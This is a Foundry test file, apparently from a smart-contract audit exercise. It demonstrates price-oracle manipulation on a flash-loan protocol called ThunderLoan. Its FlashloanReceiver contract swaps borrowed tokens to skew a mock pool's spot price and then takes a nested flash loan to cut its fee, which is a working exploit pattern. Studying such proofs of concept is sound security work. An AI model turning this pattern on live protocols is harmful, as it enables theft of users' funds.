// SPDX-License-Identifier: MIT

pragma solidity 0.8.21;

import "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "./../tswap/mocks/MockERC20.sol";
import "forge-std/console.sol";
import "./../../src/thunder-loan/protocol/ThunderLoan.sol";
import "./mocks/MockTswapFactory.sol";
import "./mocks/MockTswap.sol";
import "./../../src/thunder-loan/interfaces/IFlashLoanReceiver.sol";
import "@openzeppelin/contracts/interfaces/IERC20.sol";

contract ThunderloanTest is Test {
    ERC1967Proxy proxy;
    ThunderLoan impl;
    ThunderLoan protocol;

    MockTswapFactory factory;
    MockERC20 WETH;
    MockERC20 token;

    //starting pool liquidity: 100e18 / 100e18
    //initial rate/spotPrice 1:1
    uint256 constant POOL_WETH_SUPPLY = 100e18;
    address pOwner = makeAddr("protocolOwner");
    address user = makeAddr("user");

    function setUp() public {
        vm.deal(pOwner, 200e18);
        vm.deal(user, 1e18);

        impl = new ThunderLoan();
        vm.prank(pOwner);
        proxy = new ERC1967Proxy(address(impl), "");
        protocol = ThunderLoan(address(proxy));

        WETH = new MockERC20();
        WETH.mint(user, POOL_WETH_SUPPLY);

        token = new MockERC20();
        token.mint(user, 200e18);

        factory = new MockTswapFactory(address(WETH));
        address pool = factory.createPool(address(token));

        vm.startPrank(user);
        token.approve(pool, 100e18);
        WETH.approve(pool, 100e18);

        MockTswap(pool).deposit(
            POOL_WETH_SUPPLY,
            POOL_WETH_SUPPLY,
            POOL_WETH_SUPPLY,
            block.timestamp
        );
        vm.stopPrank();

        vm.startPrank(pOwner);
        protocol.initialize(address(factory));
        protocol.setAllowedToken(token, true);
        vm.stopPrank();

        vm.startPrank(user);
        token.approve(address(protocol), 100e18);
        protocol.deposit(token, 100e18);
        vm.stopPrank();
    }

    function test_priceOracleManipulation() public {
        FlashloanReceiver receiver = new FlashloanReceiver();
        token.mint(address(receiver), 100e18);
        vm.startPrank(user);
        receiver.switchProtocol(address(protocol));
        receiver.switchPoolFactory(address(factory));
        protocol.flashloan(address(receiver), token, 50e18, "");
        assertEq(receiver.startingFee(), receiver.endingFee());
        vm.stopPrank();
    }
}

contract FlashloanReceiver is IFlashLoanReceiver {
    bool gotLoan;
    MockTswapFactory factory;
    ThunderLoan protocol;
    uint256 public startingFee;
    uint256 public endingFee;

    function switchPoolFactory(address _factory) public {
        factory = MockTswapFactory(_factory);
    }

    function switchProtocol(address _protocol) public {
        protocol = ThunderLoan(_protocol);
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address /* initiator */,
        bytes calldata /* params */
    ) external returns (bool) {
        MockTswap pool = MockTswap(factory.getPool(token));
        if (!gotLoan) {
            gotLoan = true;
            startingFee = fee;

            (uint256 wethReserves, uint256 tokenReserves) = pool.getReserves();
            uint256 expected = pool.getOutputAmountBasedOnInput(
                amount,
                wethReserves,
                tokenReserves
            );
            IERC20(token).approve(address(pool), amount);
            pool.swapPoolTokenForWethBasedOnInputPoolToken(
                amount,
                expected,
                block.timestamp
            );
            protocol.flashloan(address(this), IERC20(token), 50e18, "");
        } else {
            endingFee = fee;
        }

        address repayAddress = address(
            protocol.getAssetFromToken(IERC20(token))
        );
        IERC20(token).transfer(repayAddress, amount + fee);
        return true;
    }
}
